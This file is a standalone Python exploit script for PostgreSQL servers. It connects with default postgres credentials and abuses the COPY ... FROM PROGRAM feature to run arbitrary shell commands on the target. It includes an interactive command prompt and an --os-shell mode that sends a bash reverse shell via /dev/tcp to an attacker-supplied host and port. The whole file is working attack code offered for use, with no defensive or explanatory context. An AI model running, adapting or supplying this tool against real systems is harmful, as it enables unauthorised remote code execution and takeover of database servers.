import psycopg2,argparse

#  if psycopg2 is missing install with -> sudo apt-get install python3-psycopg2

class psqlexp():
  def __init__(self,host,port=5432,uname='postgres',pw="postgres"):
    self.host = host
    self.port = port
    self.username = uname
    self.password = pw
    self.db_connect = None
    self.db_cursor = None
    self.lhost = ''
    self.lport = '4444'
  def connect(self):
    self.db_connect = psycopg2.connect(host=self.host, port=self.port, user=self.username, password=self.password)
    self.db_cursor = self.db_connect.cursor()
    self._create_env()
  def _create_env(self):
    # Create table and function to run command
    self.db_cursor.execute('DROP TABLE IF EXISTS cmd_exec;')
    self.db_cursor.execute('CREATE TABLE cmd_exec(cmd_output text);')
    
  def os_shell(self):
    payload = "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i>& /dev/tcp/LHOST/LPORT 0>&1\"';".replace('LHOST',self.lhost).replace('LPORT',str(self.lport))
    #print(payload)
    self.db_cursor.execute(payload)
    
  def command_exec(self):
    while True:
      cmd = input("pgsqlexp# ")
      self.run_command(cmd)
  
  def run_command(self,command):
    payload = f"COPY cmd_exec FROM PROGRAM '{command}';"
    self.db_cursor.execute(payload)
    self.db_cursor.execute("SELECT * FROM cmd_exec;")
    rows = self.db_cursor.fetchall()
    print(rows)

def parse_arguments():
  parser = argparse.ArgumentParser()
  parser.add_argument('-T','--target',help="The target host")
  parser.add_argument('-p','--port',help="The target port")
  parser.add_argument('-U','--username',help="The application Username")
  parser.add_argument('-P','--password',help="The password fo the user")
  parser.add_argument('--lhost',help="Local host to connect back")
  parser.add_argument('--lport',help="Local port to connect back")
  parser.add_argument('--cmd',action='store_true',help="Command execution on target")
  parser.add_argument('--os-shell',dest='osshell',action='store_true',help="Get reverse shell from the target")
  
  
    
  args = parser.parse_args()
  return args
    
  
def main():
  args = parse_arguments()
  # Set default values
  username = 'postgres'
  password = 'postgres'
  host = ''
  port = 5432
  
  if args.target: host = args.target
  if args.port: port = args.port
  if args.username: username = args.username
  if args.password: password = args.password
  
  
  exploit = psqlexp(host,port,username,password)
  exploit.connect()
  
  if args.lhost: 
    lhost = args.lhost
    exploit.lhost = lhost
  if args.lport: 
    lport = args.lport  
    exploit.lport = lport
  
  if args.cmd:
    exploit.command_exec()
  if args.osshell:
    exploit.os_shell()
  
  

if __name__ == '__main__':
  main()
    
    
